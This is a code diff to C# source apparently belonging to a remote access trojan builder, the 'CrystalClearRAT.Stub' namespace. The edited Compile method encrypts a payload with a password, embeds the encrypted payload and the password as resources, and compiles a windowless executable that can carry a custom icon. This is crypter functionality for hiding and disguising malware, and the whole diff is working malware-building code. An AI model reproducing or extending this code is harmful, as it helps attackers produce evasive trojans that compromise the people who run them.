@@ -17,12 +17,12 @@ namespace CrystalClearRAT.Stub
     {
 
 
-        public static string EncryptPayload(string payloadPath, string password)
+        private static string EncryptPayload(string payloadPath, string password)
         {
             string bytes = Convert.ToBase64String(File.ReadAllBytes(payloadPath));
             return StringCipher.Encrypt(bytes, password);
         }
-        public static void Compile(string payload, string outputPath, string iconPath = null)
+        public static void Compile(string payloadPath, string password, string outputPath, string iconPath = null)
         {
 
             var assembly = Assembly.GetExecutingAssembly();
@@ -43,30 +43,26 @@ namespace CrystalClearRAT.Stub
                 }
             }
 
-
-
-
-
             var csc = new CSharpCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });
-            var parameters = new CompilerParameters(new[] {
-                "mscorlib.dll",
-                "System.dll",
-                "System.Core.dll",
-                "System.Security.dll",
-            }, outputPath, true);
-            parameters.CompilerOptions = $@"/target:winexe";
+            var parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.dll", "System.Core.dll", "System.Security.dll", }, outputPath, true)
+            {
+                CompilerOptions = $@"/target:winexe"
+            };
 
             if (iconPath != null)
             {
-                parameters.CompilerOptions += $" /win32icon:{ iconPath}";
+                parameters.CompilerOptions += $" /win32icon:\"{iconPath}\"";
             }
 
-            File.WriteAllText("payload.txt", payload);
+            File.WriteAllText("payload.txt", EncryptPayload(payloadPath, password));
+            File.WriteAllText("password.txt", password);
             parameters.EmbeddedResources.Add("payload.txt");
+            parameters.EmbeddedResources.Add("password.txt");
             parameters.GenerateExecutable = true;
             CompilerResults results = csc.CompileAssemblyFromSource(parameters, codeFiles.ToArray());
             results.Errors.Cast<CompilerError>().ToList().ForEach(error => Console.WriteLine(error.ErrorText));
             File.Delete("payload.txt");
+            File.Delete("password.txt");
         }
 
     }
